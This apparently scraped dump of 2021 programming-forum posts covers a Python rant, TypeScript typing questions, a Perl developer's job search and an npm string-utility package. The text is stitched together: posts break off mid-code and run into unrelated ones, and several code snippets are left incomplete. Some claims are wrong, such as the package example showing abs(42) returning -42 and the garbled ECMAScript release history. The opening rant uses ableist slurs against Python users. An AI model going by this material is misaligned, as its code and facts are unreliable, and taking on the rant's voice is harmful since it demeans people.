4546,2021-05-07 23:52:10,4,1,"Python is an awful language due to a lot of factors. It is shilled globally for it's supposed simplicity and is usually the first language that is being recommended for those interested in programming. However, this is a very bad decision, due to the dynamic typing of e. g. Python. Whenever you see a person learning python, it becomes evident, that they do not grasp the concept of types. Python allows for syntactic nonsense like the multiplication of a list together with an integer like so \[1,2,3\] \*3 when evaluated returns \[1,2,3,1,2,3,1,2,3\]. This ambiguous usage of the asterisk operator is misleading and retarded. there should be some function that replicates a list that can be called, and the asterisk may be solely used for the multiplication of numeric types. Due to this ambiguity a lot of errors are not caught ""compile time"", leading us to runtime typechecking. RETARDED. Not suitable for anything more than a little script. The code is unreadable, noone knows what types a function takes and what it retuns. Class design is absolutely awful. Python code is an unreadable mess partially due to the missing type annotations, and partially due to the userbase of python. Children, manchildren and retards, nonexclusively. The code is often badly written, slow and slaggy. A billion libraries to do trivial stuff and other useless nonsense. Python is useful for fast prototyping or writing scripts that need to run cross-platform, if you happen to have the correct version of the language installed. And if you are lucky your script will run, and not throw a billion lightyear long stack trace in your face. It is obvious why people like python. Mainly because they have never seen anything else, and because it rewards being stupid and lazy. Also, python is not simple when leaving the scope of a hello world program, and quickly becomes an obfuscated clusterfuck. The worst thing about python is the community, however. Almost en par with the ecmascript/javascript community. The python community may be infested less by the wicked than the rust community, yet it still manages to be quite bad. The self titled ""Pythonistas"" shill their language everywhere and are absolutely seething if someone attacks python. They are like a religious sect, protecting their stupid beliefs in utter delusion, no matter the argument. If you address a weakness of python they are seething, and will spout some shit like ""Well ackshually..."", or they tell you that if you knew the language better, you would begin to love it. This could even be true as some form of stockholm syndrome. Also python users favourite food seems to be soylent. (This is not an ad hom) All in all python is absolute shit and unsuitable to teach someone how to code. Haskell is suited well better for beginners. Most people think of haskell as hard and esoteric, but it's the easiest language to learn, if you have an at least average iq and don't suffer from brain rot caused by procedural programming. (Sad, many such cases!) C is a very good alternative. If someone doesn't understand C he is never going to make it. Programming should be less accessible and less popular, this would spare us the js-framework epidemic and make the programming community in general more healthy and smarter. It's time to heal. ",Why Python is an awful programming language

4568,2021-05-18 23:56:02,1,1,"I'm thing this might be more of an issue with javascript but I wasn't entirely sure.
I have this lib that is a wrapper around a rust client application and makes a few functions available to javascript. I'm currently trying to export the functions (and their type declarations) to use in a vscode extension. I'm kind of learning javascript/typescript as I'm going along so I'm kind of lost as to what the issue is.

here are the functions I'm trying to import/export (in `lib/index.js`)
```js
""use strict"";
""enable eslint"";
const { promisify } = require('util');
const { sniper } = require(""../index.node"");
const get_triggers = promisify(sniper.get_triggers);
const get_snippet = promisify(sniper.get_snippet);

module.exports = {
  get_triggers: promisify(sniper.get_triggers),
  get_snippet: promisify(sniper.get_snippet),
  add_target: sniper.drop_target,
  drop_target: sniper.drop_target
}
```
here are the types (in `lib/index.d.ts`)
```ts
export as namespace sniper;
export function add_target(session_id: string, uri: string, language: string): void;
export function drop_target(session_id: string, uri: string, language: string): void;
export function get_snippet(language: string, snippet_key: string): Promise&lt;[string]&gt;;
export function get_triggers(session_id: string, uri: string): Promise&lt;[string]&gt;;
```
currently I'm importing it like this:
```
const { sniper } = require('sniper-node');
```
and I'm using a relative path to the library to manage depependencies

I was setting the type to be a module in the package.json and then using import both library side and extension side but it kept saying that `required()` was not allowed in `lib/index.js` despite me changing all imports to `es6` imports, and rebuilding/relaunching the project. so I switched back to commonjs to try and resolve that issue.

the current issue I'm having is this error:
```
TypeError: Cannot read property 'get_triggers' of undefined

1. Is using \*this as the thread a ""good"" way to encapsulate the output? I was having a lot of trouble with locks (discarding static modifier), and ended up removing them. It ""works"" but I know there is a small race condition between updating the string to show, and displaying the string. Any advice on how to properly lock the string to kill this race condition would be appreciated.   

2. I feel like Animation could be a constexpr class. However I know that constexpr vector is not fully supported (at least not on my g++). I attempted to use std::array, but then I need to know how many slides in the animation beforehand, which is not a big deal, but had a hard time passing that data forward to the array. 

Thanks everyone.

i'm working on a visualisation project currently using paper.js, the project should create and constantly alter the states of a big number of shapes (+150 shape on canvas) of different sizes..using paper.js the project runs fine when i have about 50 shapes laid on canvas, but after that the performance starts to decrease and my entire site starts lagging, i've seen some people complaining from a similar issue with paper.js around the internet..so i'm looking for an alternative library that offers almost the same creative freedom and is able to handle such big tasks performance-wise, can you please help me

I've seen other metal band name generators around but as a metal fan, the different strains of names you see in different genres are such a key part of metal band names, like the 100 different stoner doom bands named Bonglord, Bongzilla, Dopelord etc. So I tried to use genre information when training the model to get more genre-accurate names, and allow you to try out different combinations of genres.

I scraped every band name I could from the Encyclopaedia Metallum in Python and trained the model in Python/Tensorflow - I've got the actual model training code [on gitlab here](https://gitlab.com/warsquid/metalgen).

4612,2021-06-02 03:34:15,313,1,"I'm a self taught programmer for about 2 years now. I started off by learning python then went on to learn javascript, java, kotlin, and now go. Whenever I tried to learn these languages or new languages I always was thinking 'I could do this much easier in python.\` Python is just so nice to work with that it makes me not want to use anything else. And with no need to use anything else that means there is no drive to learn anything else. 

Most recently while I was trying to learn go I attempted to make a caeser cipher encoder/decoder. I went about this by using a slice containing the alphabet and then collecting a step. My plan was then to find the index of a letter in the code string in the slice then shift that index accordingly. In python I would simply just use `.index`. But after some research and asking questions I found that go doesn't support generics (currently) and in order to replicate this functionality I would have to use a binary sort on a sorted slice.

Python also does small quality of life things that just come with it being dynamically typed. Like when initializing variables in for loops there is no `i = 0;` etc. On top of all that there is also pip. It is so nice to just `pip install [x]` instead of having to download file then pointing to an executable. Python and pip also allows for pythons to be used for so much. Want to do some web dev? Try django or flask. Interested in AI? How about pytorch.

I guess I'm just trying to say that python is so nice to use as a developer that it makes me not want to use anything else. I'm also really looking for advice on how to over come this, besides just double down and do it.

I was actually looking for a kanban board for a project I want to make (WPF application) and hunted high and low for one that fulfilled these two criteria:

1. Dark mode
2. Create tasks and bugs and track them with no fuss

I had the most horrific time finding anything that fitted... I was even willing to pay!

I created accounts on around a dozen sites and they all failed for one reason or another: the main one was that they were all far too complicated - I just needed kanban and that's it! Oh, and trying to find one with dark-mode is just insane!

So, a month ago I started on this. I decided to build it using stuff I don't get to do in my day job (.NET developer): it's using plain javascript, C# (.NET 5) and SQL stored procedures so it's small and very fast.

It's free and if I ever decide to create a chargeable version (jury's still out - no current plans) then there will always be a perpetually-free version anyway.

It's still MVP, so it has bugs and it missing a bunch of stuff so don't complain when it breaks something :)

Anyway, enjoy and gimme a shout if something ain't right, or if you have some ideas as I'm currently using it to build the platform too... meta-tastic :)",I built a dark-mode Kanban board in .NET5 because I couldn't find one that didn't suck. I'm letting people use it for free.

writing APIs,

ORMs (what are those and why they are needed),

what is data brokering,

how to write web-sockets servers with Node.js

how to attach to SQL and NoSQL based Databases. (In past, I've wrote apis where MongoDB was primary database)

I also found ETL method/model, so want to learn more about such concepts around how data is being processed at different levels of creating software. (Not just websites, but I'm thinking of creating software that can run on different Operating Systems too).

I just want to know if there is any good outline available out there, to strengthen my learning more with a similar outline. Please suggest me any more concepts that you guys I should focus more on.

I know this is using template literal types and is using a recursive type, the part that is confusing to me is the ```${infer T}${infer U}``` what is this template?



for example in this

```javascript  
interface CamelCased {

barValue: string;

}

const snaked: ConvertCamelToSnakeCase&lt;CamelCased&gt; = {

bar_value: ""hi""

}

```


what is ```${infer T}${infer U}``` in this case? ```barValue``` or bar?

4667,2021-06-24 09:06:20,3,1,"Hi, I've been developing a pretty large project that runs on a Meteor/Apollo/React stack (Meteor is paired with MongoDB), and it's been working very well so far.

I have however faced some problems getting up and running. There aren't any up to date Meteor/Apollo guides out there on how to configure it to work with critical features such as GraphQL subscriptions. If you google ""meteor apollo"" the first few hits are basically outdated documentation on older versions of both Meteor and Apollo and a bunch of unmaintained Github repositories.

The Meteor community isn't very large either. And I've read in many places that Meteor is ""outdated/[dead](https://www.reddit.com/r/javascript/comments/mvmpcx/askjs_is_meteorjs_dead/)"", though I've found its build system and overall environment a pleasant to work in, the only pitfall being the small community, so getting help can be a bit of a challenge especially with an even smaller community using Apollo with Meteor.

That being said, there is still active development on Meteor and there *are* still people using it, it's still definitely a production-ready solution. It's extremely convenient to get up and running with out-of-the-box Accounts support, and if you just want a Meteor server and rely on its publish/subscribe methods for database operations and not have Apollo act as your middle API layer, it's easy.

It's made the full stack development experience as seamless as possible, but the Meteor/Apollo community is where I see it lacking at least for my needs in terms of getting help.

I really got started by following [Scott Tolinski's Fullstack Apollo, Meteor &amp; React Tutorial](https://www.youtube.com/watch?v=m0TC5DcFHDY&amp;list=PLLnpHn493BHFTDL9M1PKnxQwBwOZ8J-h4). It's honestly a staple of its time but sadly there's outdated information in there due to the evolution of Apollo over the years.

All that being said, one thing that's important is *where am I actually using Meteor-specific stuff in my app*? I am really only using the Accounts package. I don't use any Meteor publish/subscribe methods. Everything is done in Apollo/GraphQL. My resolvers of course deal with MongoDB, but there's nothing other than Meteor's Accounts package that I'm relying on.

I would love to hear some opinions on Meteor in general and experience anyone's had using it in 2021.

I also have a few questions:

1) If I were to want to migrate from Meteor, what are some good options if I want to stick with MongoDB?

2) What are some good options if I give up MongoDB and move to MySQL/something else?

3) Would a NextJS/Express solution be simple enough to migrate to?

I realize that these are broad and opinionated questions and it definitely does depend on what my app is currently doing. The bulk of my codebase is really in React, so I _think_ migrating to a different server would only require the server setup/configuration to be done, and if NextJS is a good solution for the front-end, just some tweaks (if any) on that front. Migrating to a different DB would be a bigger challenge as I'd need to rewrite all the DB interactions but if it needs to be done for scalability or future convenience, it needs to be done.",[AskJS] Advice on potentially migrating from Meteor

Hi /r/javascript!  


I'm asking this again, because the landscape of the broader JS ecosystem has change significantly over the past 2 years.

  
We're seeing 

* higher adoption in libraries (which benefits both TS and JS projects) (e.g.: in EmberJS and ReactJS ecosystems)
* higher adoption of using TypeScript types in JavaScript via JSDoc type annotations (e.g: remark, prismjs, highlightjs)  


For me, personally, me like of TypeScript has remained the same since I asked ya'll about this two years ago:

I use typescript because I  like to be told what I'm doing wrong -- before I tab over to my browser  and wait for an update (no matter how quick (HMR has come a long way!).

The quicker feedback loop is very much appreciated.  


So, for you, your teams, your side projects, or what ever it is, I'm interested in your experiences with both JS and TS, and why you choose one over the other.","[AskJS] If you don't use TypeScript, tell me why (2 year follow up)"

here's my javascript implementation:

    const randn = (...d) =&gt; {
        if (d.length === 0) {
            return (Math.random() * 2) - 1;
        }
    
        const [a, ...b] = d;
        const arr = [];
        for (let i = 0; i &lt; a; i++) {
            arr.push(randn(...b));
        }
    
        return arr;
    }

This works, but I'm not sure how to assign types. `...d` is obviously a `number[]` but the return type can be multi-dimensional depending on the varargs passed. I get this error when letting typescript infer the return type: 

    TS7023: 'randn' implicitly has return type 'any' because it does not have a return type annotation and is referenced directly or indirectly in one of its return expressions.

And this is its inferred type: `function randn(     ...d: number[]): number | (number | any[])[]`

I am aware that javascript has the drag &amp; drop API however I can't seem to get it working with URLs.

When I drag a file from a directory, logging the `datatransfer` object, I get: 

```
	dropEffect: ""move""
	files: FileList [ myfile ]
	DataTransferItem: length 1 
		0: {kind: ""file"", type: ""image""}

However any URL I drop over the container I get:

```
	dropEffect: ""copy""
	files: FileList [] //understandable 
	DataTransferItem: length 2 
		0: {kind: ""string"", type: ""text/x-moz-url""}

It allows you to pull in code from anywhere you like (upload file, pull from pastebin or github) and provide line-by-line comments in markdown. Multiple files can be consolidated together into one workspace. These can then be shared with a simple URL. It correctly displays and highlights code for the 193 most common programming languages.

Use case:

*We frequently get questions here saying ""why doesn't this code work?"" and the only way to respond is either to: write narrative comments (eg line 17 looks odd), which is frustratingly unstructured; or clone the repo, fix the code and do a pull request via github, which is a lot of work and ends up with a lot of stranded repos. This is designed to fix that.*

The site itself uses python/flask for the backend, hosted on a Debian Linux VPS. The frontend uses halfmoon css, javascript and some jquery. I've used the features of halfmoon and js to make what I think is quite a nice SPA-style experience. It also has a darkmode because it's 2021.

It is free to use, [open source](https://github.com/hankhank10/code-comments-dev) and doesn't even require registration.

4714,2021-07-11 16:12:25,24,1,"I want to be more competent at developing javascript, especially for browser apps. This includes the wider ecosystem, not just the language. I'm more comfortable in backend programming (python, R, java, C++, ..). I joined [r/learnjavascript](https://www.reddit.com/r/learnjavascript/), but I felt that answered micro questions (difference between == and ===), not the big stuff.

**How did you level up your javascript game?**

**Do you remember particular moments, choices, tools, blogs?**

Below is a number of things I think make javascript programming a hellscape for me. Also, perhaps I don't know what I don't know.

* Debugging in the browser is awkward. The web page takes up most of the room, the chrome debugger is less than one quarter of the screen. Changing the web page size can change behavior. I'm also not good at it.
* I don't know a good javascript IDE well. No auto-complete. I installed vscode, but don't know it well.
* Hard to set up unit tests for in-browser functionality. (Presumably there's a mock browser somewhere?)
* Many libraries (packages, plugins) seem to have no unit tests. (Examples: [editor.js nestedlist component](https://github.com/editor-js/nested-list), [summernote map plugin](https://github.com/maiyaporn/summernote-map-plugin), ..)
* Using selectors (e.g., jquery) fails silently. Sometimes the only way to find the right selector seems to be to try things at random. Example: I tried to use [clipboardjs.com](https://clipboardjs.com/). I set up the example and .. the button just didn't work. It's not clear how to debug something that just doesn't hook up.
* Javascript errors can be arcane. Undefined symbols because of version conflicts or insufficient webpack config, or different jquery versions.
* webpack is hard to truly understand.
* webpack-generated source is hard to read
* There are many different versions of javascript/typescript, and the tooling, and blog posts are often describing a version I don't have. Example: I once spent a couple of hours on a crazy error message, and it turned out the easiest thing was to remove 'type=""module""' and transpile out of typescript. Ugh.
* Popular tools change fast, so many documented things are losing momentum. (jquery?)",[AskJS] How did you level up your javascript game?

&amp;nbsp;",Your /r/javascript recap for the week of July 05 - July 11
4718,2021-07-13 04:27:45,33,1,"I've been a ""perl only developer"" for nearly 7 years now. 18 months ago, right as covid was hitting, I decided I had had enough with the way my current ""perl only"" company was managed. Basically, I was tired of being limited to handcrafting giant crud pages with minimum javascript allowed against tight time deadlines (and many times missing them) while looking at frameworks like Django that did it all for free and even had integrations for react or vuejs and had decent documentation. I felt like the world was passing my by and my skillset was rotting. And to top it off, perl is dead, and I think there are only a couple of shops in the USA that even use modern perl stacks. All of the jobs on [jobs.perl.org](https://jobs.perl.org) are for the most part stacks of pure CGI code from the 1998-2004 era and use very little from CPAN and are mostly full custom code and database interfaces. I used to pick up clients from there, but I've told myself ""never again"" (debug a 10k line custom ORM anyone?).

I thought it would be super easy to read all the Django books out there and throw together some quick apps to show off and then I'd be good to go and enjoy the new world as a ""Django Developer"". In the Perl world, everything is remote only for the most part (since there are such few employees). This was one reason why I had stayed away from python, but now due to the pandemic, everything was remote. I did have some concerns while learning Django, mostly as I made models with terse logic and complexity, googling for help only turned up blogs from prior to 2012. But hey, Django IS still popular right? So I persevered.

I quickly got an interview for a medical company expanding due to covid testing. But their stack was all Flask. So I pushed my interview date out until the next week and then crammed Flask learning. The phone interview was short and sweet from an HR lady that just said to complete the emailed coding test. It was actually pretty simple, but I still bombed it and ran out of time because I misread an error message and then never heard back. Oh well, ""I'm just getting warmed up"" I thought to myself.

Next up was an interview for a small auto parts manufacturer to manage ""a bunch of python scripts"". Needless to say, after working there for 2 weeks and submitting my first invoice, he told me he found someone local and was going to use him and if I ""needed anything any thing else"". I said ""yea, I sent you an invoice"". He still hasn't payed.

Next I spent about 2 weeks just vegging out and playing chess online everyday. My brain was fried from the Django cram course I put myself through followed by a panic driven Flask learning session and topped off by managing ""python scripts"" which turned out to be nothing but microsoft access files that connected to an on-premise sql sever instance that I didn't have access to.

The next month was no better as I had several family issues to deal with. But December was promising. I found and applied to a couple of decent ""Django jobs"" I found on [glassdoor.com](https://glassdoor.com) (while I was researching other companies). But their interview process was long and drawn out. I ended having a rather large coding project due for both of them on the last week of December. Due to Christmas traveling and a ""plumbing incident"", I never got a chance to start them. I didn't think too much of it, as one had a lot of red flags from reviews on glassdoor and the other project was to make a ""database application"". When I asked what language I could use, they said I could use ""AWS"". They basically wanted me to make a small web app that took and displayed CSV files.

From January to February, I doubled down even more on my ""Django learning"". I wrote a few example apps, and converted my blog to a Django backend. Read up on modern CSS principles and hand coded the CSS layout. But I also did some demoing with tailwind since it seemed it was popular.

March 1st, I applied to like 20 jobs that had django as a requirement on the monthly job posting over on news.ycombinator.com. Spent all month interviewing for those, but I wasn't too impressed with the ones that got back with me and they weren't too impressed with me either apparently. Unexpectedly, one was late getting back with me, and at the end of the month I landed a legit Django position for a small company to handle a new project. Things were going well, I seemed to fit right in with the Django work, but then after 4 weeks, I was informed the project was canceled and that they had no more work for me.

Since then, I've been doing the same thing every month, apply to nearly all of the django jobs on the monthly ""Who's Hiring"" hacker news thread. I get a response from about 50% of the companies I apply to. I think my resume is pretty good as all the emails I get back stating my resume stood out or my experience is impressive. For the most part, I've rewritten it a bunch of times and the first page and summary reads like I'm a Django Expert. Of course the second page with my work history has very little to do with Python or Django. I've had some promising interviews, but they all seem to go south once I'm asked to talk about my job history. I've got plenty to talk about, I've been doing IT since 2010. I've done linux admin, sysops, devops, DBA, and for the last 6 years mostly been a ""full stack web dev"". I don't have a ton of ""modern javascript"" experience, but I've written some pretty big web apps powered by vuejs for some large commercial companies so I feel like my experience should speak for itself. But still, my interviews usually end with a typical ""So you don't have any actual professional python/django experience?"". And other than stuttering and borderline making up stuff, I don't really have much to say to that question. But I also just find it insulting. I mean, I've basically only worked for 3 companies over 10 years. Certainly that shows competence? Never mind the fact I actually graduated with a four year degree in CS.

So I'm trying to figure out what I'm doing wrong. My resume gets me in the door, but my ""experience"" closes it. I've even been watching a ton of ""how to interview"" stuff on youtube. I smile, I'm friendly, I thank the people for taking their time to interview me and just generally try to make friends with them and find common ground. But I feel like having Perl on my resume is a giant stain but I can't really get away from it. I feel like the interviewers want me to spend all the time talking about amazing stuff I've done with fastapi and graphql, but I don't have that. Sure, I could try learning it, but time is precious and as luck always has it, what I study for and what I end up being interviewed for are hard to line up. Even with just sticking with ""Django"", there's a ton of ways to pair it. Basically Django + DRF or graphql, or react, or vuejs, or static pages with even more combinations of CSS frameworks...

**If I had 10 years of Django or Flask experience, would interviewing still be this hit and miss?** I feel like the python landscape is perhaps overly flooded with candidates? I mean, if you want workers, can't you just hire them? Interviews for perl devs with 10+ years experience mostly consist of ""When can you start?"". By contrast, python interviews just seem obtuse. I've got one in the pipes that I think I would actually like. But I'm waiting for them to send me a coding project that  they estimate should take 5 hours. And if I do good on that, the next part is 4-5 hours of zoom interviews part of which I need to spend an hour explaining a technical topic of my choice to their ""non-technical"" employees. And those non-technical employees actually will have a say in whether or not I get a technical job.

I just question why I am doing this to myself, but I don't know of any other options. To top it off, I don't feel like I fit with the culture of most of these new companies. Sometimes people are my age (\~40), but other times it seems like they are all under 30. They don't really want to hear about how I used to manage 90+ physical servers shoved into an extra office room or how I spent weeks debugging OpenVPN routing issues. ""We just use AWS and WireGuard"", and apparently it is now as simple as that and talking about  the ""good 'ol days"" just makes me look like someone's grandpa talking about punch cards. So I feel like I can't relate to this new generation.

My wife has always asked me what my plan is during this time. I always joked that I'd just apply to jobs until the bank account got to $0 and then I'd go to McDonald's. I'm now down to just $15k in savings and only about a 3 month runway. So I'm at a fork in the road. Do I keep applying to jobs and hope I land one within 3 months even though the last 12+ months haven't worked out? Or do I just walk away from IT and spend the little bit of money I got on tools needed for a career change? I have an uncle that runs a small auto shop. If I showed up there with $6k in tools, he'd probably give me a job at $45/hr. But.. no A/C, no benefits, and mostly lots of hard filthy work. But it is a living.. I was also debating spending the money on HVAC training. But you can only make good money with that if you run your own company and you can't really get a license without a 2+ year apprenticeship.

The sad thing is, I don't want to leave IT. I went to school for it. I've skipped my kid's birthdays over it, I missed my friend's funeral because of deadlines. I feel like I've sold my soul for it. Do I really just walk away? I'm really struggling at the thought of more interviews. Everyone wants me to hit the floor running on day one.

&amp;#x200B;

So let's say i have an array of objects. 

&amp;#x200B;

    var cute-players = []
    var baseball-player = [
        {name=""John Mann"", type=""sexy"", position=""pitcher""},
        {name=""Johnny Mann"", type=""cute"", position=""pitcher""},
        {name=""John Manny"", type=""cute"", position=""pitcher""},
        {name=""Johny Manny"", type=""cute"", position=""pitcher""},
    ]
    
    for (let i = 0; i &lt; baseball-player.length; i++) {
        if    baseball-player[i].type == ""cute""
            cute-players.push(baseball-player[i])
    
    }

&amp;#x200B;

So using above, I want create a variable and copy only data with its type ""sexy"" from the above array and my code is above. I tried 'add()' and few other general things i know and could find on Google but none of them works... 

&amp;#x200B;

Any guidance or advice will be great. Also, i was told Typescript is just an ""Pro"" version if Javascript. So whenever I have an issue with syntax or others, does it matter if i include ""javascript"" when googling for soutions?",How can I create a sub-array from an array of objects that have a matching value for one of its properties?
4722,2021-07-13 23:12:32,7,1,"Welcome r/javascript community!

Today I would like to introduce you to my npm package, which can be useful for any beginner or advanced JavaScript developer.

It's a collection of functions inspired from Python and rewritten for  JavaScript, so now you can easily e.g. capitalize a string or display  e.g. last 4 characters from a string.

To check it out, just install it quickly and easily via npm

```
$ npm install simhok
# or
$ yarn add simhok
```

Now all we have to do is import the package into JS project

```javascript
// import what you need
const { len, capitalize } = require(""simhok"");
```

Examples of usage with the result

```javascript
const user = ""sebastian"";
const users = [""sebastian"", ""klaudia""];
const hello = ""hello world"";

len(user);           // number:9
len(users);          // number: 2
capitalize(user);    // string: Sebastian
capitalizeAll(user); // string: Sebastian
upper(user);         // string: SEBASTIAN
lower(user);         // string: sebastian

startswith(user, ""s""); // boolean: true
startswith(user, ""S""); // boolean: false
endswith(user, ""n"");   // boolean: true

rstrip(user, ""an"");   // string: sebasti
lstrip(user, ""s"");    // string: ebastian

split(user, [0]);     // string: s
split(user, [0, 2]);  // string: se
split(user, [3, 0]);  // string: astian
split(user, [0, -3]); // string: ian

let james_bond = 7;
zfill(james_bond, 2); // string: 007

compareIgnoreCase(""Sebastian"", ""sebastian""); // boolean: true

abs(42);  // number: -42
abs(-42); // number: 42

log(""This is pretty awesome 🎉""); // ""This is pretty awesome 🎉""
```

            view: WebView?,

4746,2021-07-26 22:33:38,4,1,"Hi.

I was wondering if it makes sense to learn and practice typescript without relying on framework. I thought about learning typescript along with react but it seems too big and feature rich for hobbyist like me who just want to add simple web application / demo on my personal website for fun.

Given that I know rudimentary level of HTML5/CSS and how javascript interact with DOM, do you think it makes sense to port simple things like simulator (I like poker and gambling in general so I have few things in mind) or games that I already wrote in python to typescript? Has anyone done something similar?

Thanks",Practising typescript without framework?
4747,2021-07-27 01:14:29,12,1,"Hi, just joining r/javascript, though I am an experienced Ruby/javascript developer.

I am working on a a couple of new projects, (native hybrid mobile apps using webviews) and I want to kick the jQuery habit once and for all. In previous projects, I've written more and more vanilla js as time permitted. On this one, I want to get rid of jQuery completely.

One thing I do not want to give up is event delegation, which I find invaluable. I don't want to be constantly attaching and detaching event listeners. While I want to embrace vanilla JS, I don't want to roll my own for this.

I've come across a few snippets, but they are pretty basic and certainly don't cover all the bases.

And a small number of libraries, like:

    github: cferdinandi/events

    github:dgraham/delegated-events

that don't seem too recently maintained, like nothing in the past 2 years or so. (But perhaps browsers are now stable, and no need to maintain anything).

Looking for a small, currently-maintained, performant library dealing with all aspects of event delegation, triggering, etc. e.g. similar to jQuery `$.on()`, `$.trigger()` etc.

I only need to support modern browsers, and only Safari and Chrome on iOS/Android. I don't need to support Android before 6.0, nor iOS before 12.5.3. Probably no need for polyfills.

I have used interact.js but that is a bit much for the current project. That gets me a fast ""tap"" event (but is this even an issue any more? That is, slow click has gone the way of the Dodo bird, right?) and a lot of cool interactions that I probably don't need. But I don't think it solves generic event delegation.

I tend to do a lot of Ajax to the MVC (an embedded Ruby server) and triggering of UI events from MVC (via a JS bridge), and typically structure the UI along the lines of a SPA - single document with hidden ""pages"" ala jQuery Mobile, so the CSS and JS gets loaded once at startup, and there is a lot of content replacement, and so delegation seems the way to go.

*You must already be familiar with JavaScript if you have worked on any Web development project as JavaScript has been here for quite a long time now. Besides being a popular scripting language, JavaScript has served in developing enormous web projects. However, ever since TypeScript has come to play, the dynamics have changed. Initially, JavaScript code was unable to handle complexities. Hence, TypeScript was introduced. It is an open-source programming language that is usually adopted for large applications. Although both serve the same purpose, they are quite different from each other.*

## Instigation

To be quite clear, each of your JavaScript codes is valid in TypeScript; which denotes that TypeScript is a bigger picture or bigger scope of JavaScript. In simple terms,

***JavaScript + extra features = Typescript***

Hence, if you save your (.js) JavaScript file with (.ts) TypeScript extension, it will work just as fine. However, do not misunderstand that JavaScript and TypeScript are the same. This guide states the basic differences between both of them. Without much introduction, let’s get a brief overview of these languages!

## What is JavaScript?

JavaScript is the most in-demand and preferred programming language- whether for the Web or to go with HTML. Javascript is Cross-platform and lightweight; it is an object-based scripting language used to build client-side dynamic pages.

Each program in the JavaScript language is known as a script. These scripts are noted in HTML pages and implemented automatically when the page loads. JavaScript is carried out as plain text. Hence, it does not require any special or unique compilation and preparations to run. There are several [Javascript frameworks](https://www.bacancytechnology.com/blog/javascript-frameworks-trends-2018) in the market that you must know about.

### History Of JavaScript

Created by Brendan Eich(programmer of Netscape Communications Corporation), JavaScript was built to work on Netscape navigator. However, with a huge gain in popularity, this popular scripting tool turned to LiveScript. Later, It was again renamed as JavaScript to consider the Java support of Netscape within its browser.

Below is a significant landmark in the History of JavaScript. Let’s have a look!

* Launched back in September 1995, JavaScript took ten days to develop. Initially, it was known as Mocha.
* Later, in November 1996, Netscape presented JavaScript to the European Computer Manufacturers Association(ECMA) International.
* In 1998, ECMAScript 2 was released
* In 1999, ECMAScript 3 was released
* Later in 2005, Mozilla and Eich joined ECMA to build E4X JavaScript.
* January 2009 was the day when the CommonHS project was launched to define a usual and common standard library.
* In 2011 June, ECMAScript 5.1 was released
* In 2015 June, ECMAScript 2016 was released
* In 2017 June, ECMAScript 2017 was released. This is the current version as of now.

### Features Of JavaScript

https://preview.redd.it/qqsk0ztop8i71.png?width=1100&amp;format=png&amp;auto=webp&amp;s=c2235cf60aa92a41f72037beefd3fa1e47b4b51c

* JavaScript is a Cross-platform language
* It has a high learning curve
* It is easy and friendly to get started with
* JavaScript is used for server-side and client-side
* It is extremely robust, flexible, and powerful
* JavaScript is a dynamic language
* It has added dependencies
* It offers a robust testing workflow
* You have all the freedom and right to operate it however you wish to.

4823,2021-08-23 19:35:53,2,1,[removed],Question about javascript memory classes
4824,2021-08-24 18:13:45,2,1,"  I have been lost in my programming journey. I started out teaching myself C# by watching tutorials on youtube and videos on Udemy.  I really enjoyed it, but my progress was slowing way down and wasn't as self motivated as I should be.  I felt like I needed a structure to follow and something to make me accountable (I have never really been good at self motivation). 

  That's when I decided to look into boot camps. I have a friend of a friend that suggested Galvanize/Hack Reactor. He went there and got a nice paying job soon after graduation. I looked into the camp and noticed two things, one: they were teaching more web development (javascript) and not standalone program creation like Java or C#, and two: it costs $18,000. That is pretty expensive! But I do know myself, and that cost will motivate me and make me accountable. 

  After studying up on javascript and going through Galvanize's pre study program I realized I don't care for javaspript as much as C#. I don't really care that it is only web based, and building websites don't tickle my fancy.  I would rather build a standalone application. The thing I really enjoyed with C# is that I like the idea of creating games, and create programs that I can turn into an app on my phone. Also the syntax of C# seems easier and more clean. 

  I started to look for code camps that I can attend in C# but couldn't really find any. Everyone wants to teach you web development. So pretty much I got supper deflated the other day and felt lost. I just had my first kid a month ago (which is amazing), but I am super unhappy with my current job. My wife is encouraging me to go all in and do what I need to do to change my career. I want to make this change now while my son is young so I can spend more time with him when he's moving around.  

  I would love some advice on what to do. Should I switch back to C# and just keep doing tutorials (and hopefully stay motivated)? Or take the code camp to help me push through? One of he only class/C# structured learning I ran into was Tim Corry's complete C# course for $250 (way less than the boot camp). I just fear that me teaching myself without a step by step process won't get anywhere and time will keep on ticking by. Also supposedly jobs will want you to know javascript as well as C# (or at least that is what I am seeing). And the code camp hopefully will help me find a job after graduation vs me self studying C# and being lost on when to start looking for a job and to know when I'm ready.

  Thank you for reading this and any advice you can give me would be super helpful. If you have any questions let me know and I will get back to you.",I am feeling deflated and don't know what direction to take

4830,2021-08-26 03:24:31,24,1,"So i’m migrating a fairly small pet project from vanilla javascript to TS, and have been loving how it makes it easier to understand what’s going on when I’m juggling objects around.

One thing I’m struggling with, though: I have a class with a few attributes that get their values in different phases.

Say I instantiate my object with just an ID. Then I read a few config options from disk. And then afterwards I load more data from a web API somewhere.

The way I’m currently doing it, only the ID is required, and that is fine, I guess. The thing is, I forcibly exit the program if I can’t get these other data from disk or API. So my code is now full of optional chaining, null coalescing, and just generally testing for empty variables everywhere, when I know that’s not needed most of the time.

So what are my options here?

- I could just turn strictnullchecks off, but from reading around, I reckon that’s not desired.
- My linter is set to not let me use non-null assertions, which I understand you should not use if you use strictnullchecks since it defeats the purpose, I guess?
- is there maybe a way with Partial, Pick, Omit, and the like? Not sure.

What do you guys do in these cases?

Thanks!","New to typescript and just LOVING it. Having a hard time with strictnullcheck, though."

4855,2021-09-05 11:24:34,10,1,"Let me explain.

I first started with javascript, and for me, objects are variables that hold other varaibles with a name. A sort of an array, but you can name the indexes. So when I learned that C can do structs, which are essentially ""objects"" , and they can hold variables of different types inside them, and also other structs, I was mind-blown. Because it was C, and it had objects. The possibilities suddenly became endless.


So in this regard, how is C++ more object-oriented, than C? If C can have objects, and you could probably make your program in such a way that you could make struct object classes and have various objects each being of the same type but being their own entity. Only thing I'm unsure of is are constructors and class inheritance. I think I read somewhere that you CAN put functions into variables, so that's for methods I guess.



Another thing is, I don't think OO and procedural are even talking about the same thing. The opposite of OO is I dunno, not using objects as a primarily building block. And the opposite of procedural is the async method of catching callbacks and  random stuff (which are probably on the bottom level also in some orderly array waiting to get listened to.)

	type AllTags =
		| {
				[K in Tag]: Array&lt;{

		post.tags.forEach((tag) =&gt; {
			const temp = {
				title: post.title,
				url: post.slug,
			}

				allTags[tag].push(temp)
			} else {
				allTags[tag] = [temp]

I want this function to return an object like:

```ts

			title: '',

		}],
		'reactjs': [{
			title: '',
			url: '',
		}]
	},
